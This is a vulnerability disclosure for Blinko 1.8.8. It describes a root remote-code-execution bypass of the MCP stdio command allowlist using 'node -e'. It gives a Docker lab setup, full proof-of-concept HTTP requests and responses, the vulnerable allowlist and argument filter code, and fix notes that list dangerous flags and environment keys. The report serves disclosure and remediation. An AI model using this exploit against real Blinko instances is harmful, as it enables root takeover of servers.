### Vulnerability details

**Official website / Product:** https://blinko.space/

**Repository:** https://github.com/blinkospace/blinko (stars at selection: 11144)

**Vulnerability type:** RCE (incomplete MCP stdio command allowlist bypass / getshell)

**Vulnerability versions:** 1.8.8 (`blinkospace/blinko:latest` Docker; source `package.json` version 1.8.8, audited commit `b2586d03fddb796252f050a96922879bf4a41fad`)

**Vulnerability URL / Parameter:** `POST /api/v1/mcp-servers/create` fields `command`/`args`; trigger: `POST /api/v1/mcp-servers/test-connection` (`id`)

**Complex:** yes

### Verification procedure

1. Lab rebuild (original `labs/blinko-r28a4/` was removed after verify; recreate with the same shape). Image `blinkospace/blinko:latest` (app 1.8.8) + `postgres:14`, host port **20804→1111**, containers `blinko-r28a4-app` / `blinko-r28a4-db`. Save the following as `docker-compose.yml`, run `docker compose up -d`, and wait until `http://127.0.0.1:20804/` responds. Audited commit: `b2586d03fddb796252f050a96922879bf4a41fad`.

```yaml
networks:
  blinko-network:
    driver: bridge

services:
  app:
    image: blinkospace/blinko:latest
    container_name: blinko-r28a4-app
    environment:
      NODE_ENV: production
      NEXTAUTH_URL: http://127.0.0.1:20804
      NEXT_PUBLIC_BASE_URL: http://127.0.0.1:20804
      NEXTAUTH_SECRET: my_ultra_secure_nextauth_secret
      DATABASE_URL: postgresql://postgres:mysecretpassword@db:5432/postgres
    depends_on:
      db:
        condition: service_healthy
    restart: unless-stopped
    ports:
      - "20804:1111"
    networks:
      - blinko-network

  db:
    image: postgres:14
    container_name: blinko-r28a4-db
    restart: unless-stopped
    environment:
      POSTGRES_DB: postgres
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: mysecretpassword
    healthcheck:
      test: ["CMD", "pg_isready", "-U", "postgres", "-d", "postgres"]
      interval: 5s
      timeout: 10s
      retries: 5
    volumes:
      - blinko_pg:/var/lib/postgresql/data
    networks:
      - blinko-network

volumes:
  blinko_pg:
```

2. First registered user becomes `superadmin`. Register then login for a Bearer token (PoC account: `admin` / `Admin123!`):

```http
POST /api/v1/user/register HTTP/1.1
Host: 127.0.0.1:20804
Content-Type: application/json
Accept: application/json
Connection: close

{"name":"admin","password":"Admin123!"}
```

```http
POST /api/v1/user/login HTTP/1.1
Host: 127.0.0.1:20804
Content-Type: application/json
Accept: application/json
Connection: close

{"name":"admin","password":"Admin123!"}
```

Login returns JSON with `role` (`superadmin` for the first user) and `token`. Replace `Authorization: Bearer …` in the PoC packets below with that token (the captured JWT is lab-specific).

3. `POST /api/v1/mcp-servers/create` with `type=stdio`, `command=node`, `args=["-e","<arbitrary JS>"]`. Both `ALLOWED_MCP_COMMANDS` and `areArgsSafe` accept the payload (`-e` and pure JS contain none of the blocked shell metacharacters).
4. `POST /api/v1/mcp-servers/test-connection` causes the server to `spawn(node, ['-e', ...])` via `StdioClientTransport`.
5. Inside the container, `/tmp/BLINKO_MCP_RCE_PROOF` contains `uid=0(root)`, proving arbitrary command execution as root on the official image:

```bash
docker exec blinko-r28a4-app ls -la /tmp/BLINKO_MCP_RCE_PROOF
docker exec blinko-r28a4-app cat /tmp/BLINKO_MCP_RCE_PROOF
```

Expected output:

```
-rw-r--r--    1 root     root           138 Nov  1 22:54 /tmp/BLINKO_MCP_RCE_PROOF
----
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### Complete vulnerability PoC

Complete HTTP request 1 — create MCP server (allowlist bypass accepted; Docker-verified):

```http
POST /api/v1/mcp-servers/create HTTP/1.1
Host: 127.0.0.1:20804
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoic3VwZXJhZG1pbiIsIm5hbWUiOiJhZG1pbiIsInN1YiI6IjEiLCJleHAiOjQ5NDcxNzMyNTYsImlhdCI6MTc5MzU3MzI1Nn0.8ctCqHMhl1MjMvUP7yt6d1WKt60WkiVELY_KvtSGHhs
Content-Type: application/json
Accept: application/json
User-Agent: blinko-r28a4-poc
Content-Length: 239
Connection: close

{"name":"poc-node-e-rce","description":"whitelist bypass","type":"stdio","command":"node","args":["-e","require(\"fs\").writeFileSync(\"/tmp/BLINKO_MCP_RCE_PROOF\",require(\"child_process\").execSync(\"id\").toString())"],"isEnabled":true}
```

Complete HTTP response 1 (Docker-verified):

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Vary: Origin
Access-Control-Allow-Credentials: true
Content-Type: application/json
Date: Sun, 01 Nov 2026 22:53:29 GMT
Connection: close
Content-Length: 361

{"id":3,"name":"poc-node-e-rce","description":"whitelist bypass","type":"stdio","command":"node","args":["-e","require(\"fs\").writeFileSync(\"/tmp/BLINKO_MCP_RCE_PROOF\",require(\"child_process\").execSync(\"id\").toString())"],"url":null,"env":null,"headers":null,"isEnabled":true,"createdAt":"2026-11-01T22:53:29.478Z","updatedAt":"2026-11-01T22:53:29.478Z"}
```

Complete HTTP request 2 — trigger spawn/execution:

```http
POST /api/v1/mcp-servers/test-connection HTTP/1.1
Host: 127.0.0.1:20804
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoic3VwZXJhZG1pbiIsIm5hbWUiOiJhZG1pbiIsInN1YiI6IjEiLCJleHAiOjQ5NDcxNzMyNTYsImlhdCI6MTc5MzU3MzI1Nn0.8ctCqHMhl1MjMvUP7yt6d1WKt60WkiVELY_KvtSGHhs
Content-Type: application/json
Accept: application/json
User-Agent: blinko-r28a4-poc
Content-Length: 8
Connection: close

{"id":3}
```

Complete HTTP response 2 (MCP handshake failure is expected: the `-e` script writes the file and exits; the side effect is the RCE):

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Vary: Origin
Access-Control-Allow-Credentials: true
Content-Type: application/json
Date: Sun, 01 Nov 2026 22:54:00 GMT
Connection: close
Content-Length: 111

{"success":false,"error":"Failed to connect to MCP server poc-node-e-rce: MCP error -32000: Connection closed"}
```

Verification result notes:

- create returns HTTP 200 and echoes the dangerous `args`, proving `ALLOWED_MCP_COMMANDS` + `areArgsSafe` do not block `node -e`.
- test-connection spawns via `StdioClientTransport`; container file `/tmp/BLINKO_MCP_RCE_PROOF` contains `uid=0(root) gid=0(root) ...` — arbitrary command execution as root on the official image.

### Vulnerability analysis

Version 1.8.4 added a command allowlist and argument regex filter for CVE-2026-23882 / GHSA-59r2-82p8-c56v. The allowlist explicitly includes interpreters (`node`/`python`/`python3`/`bun`/`deno`/`npx`), while `areArgsSafe` only blocks shell metacharacters and some paths — **not interpreter code-execution flags** such as `node -e` / `--eval`. A `superadmin` (the first registered user on a fresh instance) can submit `command=node` with `args=["-e","<JS>"]`; `test-connection` / `getTools` then spawn that process through the MCP SDK, yielding root RCE in the official Docker image. The unvalidated `env` field enables related variants (e.g. `NODE_OPTIONS`).

Trigger / sink source (full path and line numbers):

```typescript
# File: server/routerTrpc/mcpServers.ts
# Lines: 34-99, 160-175
const ALLOWED_MCP_COMMANDS = [
  'npx',
  'node',
  'python',
  'python3',
  'bun',
  'deno',
];

function areArgsSafe(args: string[]): boolean {
  const dangerousPatterns = [
    /[;&|`$]/g,
    /\$\(/g,
    /`/g,
    />\s*\//g,
    /\/etc\//g,
    /\/proc\//g,
    /\/sys\//g,
    /\.\./g,
    /&&/g,
    /\|\|/g,
    /<|>/g,
  ];
  for (const arg of args) {
    for (const pattern of dangerousPatterns) {
      if (pattern.test(arg)) {
        return false;
      }
    }
  }
  return true;
}

// create mutation:
if (input.type === 'stdio') {
  if (!input.command || !isCommandAllowed(input.command)) { /* reject */ }
  if (input.args && !areArgsSafe(input.args)) { /* reject */ }
}
```

```typescript
# File: server/aiServer/mcp/McpClientManager.ts
# Lines: 185-197
private createStdioTransport(config: mcpServers): StdioClientTransport {
  if (!config.command) {
    throw new Error('stdio transport requires a command');
  }
  const args = (config.args as string[]) || [];
  const env = (config.env as Record<string, string>) || {};
  return new StdioClientTransport({
    command: config.command,
    args,
    env: { ...process.env, ...env } as Record<string, string>
  });
}
```

### Fix notes

- For allowlisted interpreters, block `-e`/`--eval`/`-c`/`--print`/`-r`/`--require`/`--import`/`--loader`/`--inspect*` (including `--flag=value` forms).
- Validate or strip dangerous `env` keys (`NODE_OPTIONS`, `PYTHON*`, `LD_PRELOAD`, `PATH`, etc.).
- For `npx`/`bun`/`deno`, disallow remote URL execution and unconstrained `-y` package fetch; prefer fixed script-path allowlists.
- Do not run the official Docker image as root.
